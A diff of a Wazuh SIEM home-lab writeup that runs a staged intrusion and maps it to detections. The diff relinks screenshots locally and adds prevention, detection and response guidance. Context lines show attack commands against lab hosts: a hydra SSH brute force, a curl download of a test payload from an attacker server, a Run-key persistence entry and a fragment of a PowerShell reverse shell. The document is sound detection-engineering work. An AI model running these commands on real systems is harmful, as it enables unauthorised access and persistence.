@@ -130,7 +130,7 @@ nmap -sS -T4 -p- 192.168.60.1
 ping -c 5 192.168.60.1
 ```
 
-![Figure 2 — Stage 1 evidence screenshot](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage1_recon.png)
+![Figure 2 — Stage 1 evidence screenshot](../screenshot/Stage1_recon.png)
 
 *Figure 2 — Stage 1: reconnaissance evidence screenshot (as placed in the original writeup).*
 
@@ -161,7 +161,7 @@ ping -c 5 192.168.60.1
 hydra -L user.txt -P password.txt ssh://192.168.60.1
 ```
 
-![Figure 3 — Stage 2 evidence screenshot](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage2_bruteforce.png)
+![Figure 3 — Stage 2 evidence screenshot](../screenshot/Stage2_bruteforce.png)
 
 *Figure 3 — Stage 2: brute-force evidence screenshot (as placed in the original writeup).*
 
@@ -191,7 +191,7 @@ hydra -L user.txt -P password.txt ssh://192.168.60.1
 ssh lenovo@192.168.60.1
 ```
 
-![Figure 4 — Stage 3 evidence screenshot](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage3_access.png)
+![Figure 4 — Stage 3 evidence screenshot](../screenshot/Stage3_access.png)
 
 *Figure 4 — Stage 3 evidence screenshot (as placed in the original writeup).*
 
@@ -259,7 +259,7 @@ systeminfo
 tasklist
 ```
 
-![Figure 5 — Stage 5 evidence screenshot](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage5_discovery.png)
+![Figure 5 — Stage 5 evidence screenshot](../screenshot/Stage5_discovery.png)
 
 *Figure 5 — Stage 5 evidence screenshot (as placed in the original writeup).*
 
@@ -296,11 +296,11 @@ python3 -m http.server 8000
 curl http://192.168.60.135:8000/eicar-facebook.com -o "C:\Users\LENOVO\Downloads\virustotaltest\eicar2.com"
 ```
 
-![Figure 6 — Stage 6 evidence screenshot 1 of 3](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage6_payload1.png)
+![Figure 6 — Stage 6 evidence screenshot 1 of 3](../screenshot/Stage6_payload1.png)
 
-![Figure 7 — Stage 6 evidence screenshot 2 of 3](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage6_payload2.png)
+![Figure 7 — Stage 6 evidence screenshot 2 of 3](../screenshot/Stage6_payload2.png)
 
-![Figure 8 — Stage 6 evidence screenshot 3 of 3](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage6_payload3.png)
+![Figure 8 — Stage 6 evidence screenshot 3 of 3](../screenshot/Stage6_payload3.png)
 
 *Figures 6–8 — Stage 6: the three alerts raised by one download (Suricata, FIM, VirusTotal), as placed in the original writeup.*
 
@@ -330,7 +330,7 @@ curl http://192.168.60.135:8000/eicar-facebook.com -o "C:\Users\LENOVO\Downloads
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "UpdaterSvc" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
 ```
 
-![Figure 9 — Stage 7 evidence screenshot](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage7_persistence.png)
+![Figure 9 — Stage 7 evidence screenshot](../screenshot/Stage7_persistence.png)
 
 *Figure 9 — Stage 7 evidence screenshot (as placed in the original writeup).*
 
@@ -380,7 +380,7 @@ while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
 $client.Close()
 ```
 
-![Figure 10 — Stage 8 evidence screenshot](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage8_C2.png)
+![Figure 10 — Stage 8 evidence screenshot](../screenshot/Stage8_C2.png)
 
 *Figure 10 — Stage 8 evidence screenshot (as placed in the original writeup).*
 
@@ -435,7 +435,7 @@ Add-Content -Path C:\Users\LENOVO\Downloads\virustotaltest\eicar.com -Value "mod
 Remove-Item C:\Users\LENOVO\Downloads\virustotaltest\eicar2.txt -Force
 ```
 
-![Figure 11 — Stage 9 evidence screenshot](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage9_fim.png)
+![Figure 11 — Stage 9 evidence screenshot](../screenshot/Stage9_fim.png)
 
 *Figure 11 — Stage 9: file modified and file deleted, as placed in the original writeup.*
 
@@ -582,6 +582,14 @@ The chain was run in two sessions: Stages 1–7 on 2026-08-28 and Stages 8–10 
 
 | Stage | Prevent | Detect | Respond |
 |---|---|---|---|
+| Reconnaissance | Segment the network, expose fewer services | Port-scan detection on the endpoint and on the firewall | Block or rate-limit the source |
+| Brute Force | MFA or key-only SSH, account lockout policy, `MaxStartups` | Failed-logon bursts correlated by user and source | Disable or reset the targeted account |
+| Successful Access | Strong unique passwords, restrict who can log in over SSH | Success after a failure burst | Revoke sessions, rotate credentials |
+| Execution | Script Block Logging (Event `4104`), Constrained Language Mode | Encoded commands from any parent process | Isolate the host, collect the decoded payload |
+| Discovery | Least privilege | Bursts of discovery binaries by one user | Review the session timeline |
+| Payload Drop | Egress filtering, application control | Network, FIM and hash-reputation alerts together | Quarantine the file |
+| Persistence | Restrict Run-key writes, baseline autostart entries | Registry Run key changes (Sysmon EID 13) | Remove the entry, investigate the writer |
+| Command and Control | Egress filtering by port and destination | Shell banners, scripting engines with outbound connections | Block the destination, isolate the host |
 | LSASS access | Credential Guard, restrict dump tools | `ProcessAccess` on `lsass.exe` with suspicious access masks | Treat all credentials on the host as exposed |
 | Anti-Forensics | Forward logs off-host in real time | Dedicated alert for Events `1102` / `1100` | Preserve the SIEM copy as evidence |
 | Exfiltration | DLP, egress allow-lists | Volume- and behaviour-based network detection | Block the channel, assess data exposure |
@@ -596,21 +604,21 @@ The lab shows that the planned detections can follow an intrusion from the first
 
 ## Appendix A — Screenshot Index
 
-The images are hosted on HackMD. Keep local copies in the repository so the report does not depend on an external host.
+Screenshots are stored in the repository under [`screenshot/`](../screenshot/), so the report does not depend on an external host.
 
-| Figure | Stage | Source | Suggested local file |
-|---|---|---|---|
-| 1 | Architecture | Repository image (`architecture/`) | — |
-| 2 | 1 Reconnaissance | `hackmd.io/_uploads/Sk-LnqADfl.png` | `screenshots/stage1-recon.png` |
-| 3 | 2 Brute Force | `hackmd.io/_uploads/S1wGXj0Dfg.png` | `screenshots/stage2-bruteforce.png` |
-| 4 | 3 Successful Access | `hackmd.io/_uploads/H1kimjADMx.png` | `screenshots/stage3-access.png` |
-| 5 | 5 Discovery | `hackmd.io/_uploads/Byvden0DGe.png` | `screenshots/stage5-discovery.png` |
-| 6 | 6 Payload Drop (1/3) | `hackmd.io/_uploads/ryHT4hRwze.png` | `screenshots/stage6-payload-1.png` |
-| 7 | 6 Payload Drop (2/3) | `hackmd.io/_uploads/SJWGU3Avzl.png` | `screenshots/stage6-payload-2.png` |
-| 8 | 6 Payload Drop (3/3) | `hackmd.io/_uploads/SJpRYnCDze.png` | `screenshots/stage6-payload-3.png` |
-| 9 | 7 Persistence | `hackmd.io/_uploads/S1Y8phADfe.png` | `screenshots/stage7-persistence.png` |
-| 10 | 8 Command and Control | `hackmd.io/_uploads/H1w00Wx_Gg.png` | `screenshots/stage8-c2.png` |
-| 11 | 9 File Lifecycle | `hackmd.io/_uploads/S1moKGxdMe.png` | `screenshots/stage9-fim.png` |
+| Figure | Stage | File |
+|---|---|---|
+| 1 | Architecture | [`architecture/Architecture-and-data-flow.png`](../architecture/Architecture-and-data-flow.png) |
+| 2 | 1 Reconnaissance | [`Stage1_recon.png`](../screenshot/Stage1_recon.png) |
+| 3 | 2 Brute Force | [`Stage2_bruteforce.png`](../screenshot/Stage2_bruteforce.png) |
+| 4 | 3 Successful Access | [`Stage3_access.png`](../screenshot/Stage3_access.png) |
+| 5 | 5 Discovery | [`Stage5_discovery.png`](../screenshot/Stage5_discovery.png) |
+| 6 | 6 Payload Drop (1/3) | [`Stage6_payload1.png`](../screenshot/Stage6_payload1.png) |
+| 7 | 6 Payload Drop (2/3) | [`Stage6_payload2.png`](../screenshot/Stage6_payload2.png) |
+| 8 | 6 Payload Drop (3/3) | [`Stage6_payload3.png`](../screenshot/Stage6_payload3.png) |
+| 9 | 7 Persistence | [`Stage7_persistence.png`](../screenshot/Stage7_persistence.png) |
+| 10 | 8 Command and Control | [`Stage8_C2.png`](../screenshot/Stage8_C2.png) |
+| 11 | 9 File Lifecycle | [`Stage9_fim.png`](../screenshot/Stage9_fim.png) |
 
 Stages 4, 8b, 10 and 11 have no screenshots; their evidence is the raw alert or, for 8b and 11, nothing yet.
 
